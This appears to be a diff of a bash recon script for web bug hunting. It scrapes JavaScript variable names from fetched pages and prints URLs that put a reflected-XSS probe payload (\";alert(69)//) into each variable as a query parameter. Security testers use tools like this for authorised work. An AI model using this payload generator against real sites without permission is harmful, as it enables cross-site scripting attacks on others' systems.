@@ -4,20 +4,15 @@ cat tmp | concurl -c 100 -d 10 &>/dev/null
 
 #logger "[+] Extracting vars"
 cd out
-gf jsvar > tmp
+#gf jsvar > tmp
 
-while read line
+for source in $(find -type f)
 do
-	url=$(cat $(echo "$line" | cut -d: -f1) | head -1 | awk '{print $4}')
-
-	varName=$(echo "$line" | awk '{print $2}' | cut -d= -f1)
-	echo "$url?$varName=\";alert(69)//"
-	#if [ $(echo $url | awk -F"/" '{print NF}') -lt 4 ]
-	#then
-	#	echo "$url/?$varName=\";alert(69)//"
-	#else
-	#	echo "$url?$varName=\";alert(69)//"
-	#fi
-done < tmp
+        url=$(cat $source | head -1 | awk '{print $4}')
+        for var in $(cat $source | grep -oP "var [a-z0-9_]+" | awk '{print $2}')
+        do
+                echo "$url?$var=\";alert(69)//"
+        done
+done
 cd .. && rm tmp && rm out -r
-echo "====================== ..DARY! ======================"
+echo "======================================= ..DARY! ================================"
